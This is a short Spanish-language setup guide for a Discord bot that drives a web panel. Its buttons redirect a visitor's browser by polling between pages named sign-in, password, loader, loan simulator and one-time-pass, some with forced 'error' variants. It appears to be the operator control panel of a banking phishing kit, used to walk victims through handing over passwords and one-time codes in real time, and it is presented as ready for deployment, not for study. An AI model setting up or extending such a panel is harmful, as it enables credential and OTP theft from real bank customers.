CONFIGURACIÓN DEL BOT DE DISCORD
================================

1. Copia .env.example a .env y completa:
   - DISCORD_BOT_TOKEN
   - DISCORD_CHANNEL_ID
   - DISCORD_CLIENT_ID

2. En el Developer Portal de Discord:
   - Activa "MESSAGE CONTENT INTENT" si usas contenido de mensajes.
   - Invita el bot al servidor con permisos: Send Messages, Embed Links, Use Application Commands.

3. Instala y ejecuta:
   npm install
   npm start

4. Despliega en Render/Railway/Azure y actualiza en los HTML:
   window.DISCORD_CONTROL_API = 'https://tu-url-del-api';

BOTONES DEL PANEL (redirigen el entorno vía polling):
- SIGN - IN          -> accces-sign-in.php.html
- SIGN-IN-ERROR      -> access-sign-in-pass.php.html?error=1
- ACCES - PASS       -> access-sign-in-pass.php.html
- LOADER             -> loader.html
- LOAN-SIMULATOR     -> loan-simulator.php.html
- ONE-TIME           -> one-time-pass.php.html
- ONE-TIME-ERROR     -> one-time-pass.php.html?error=finish (modal con carita)
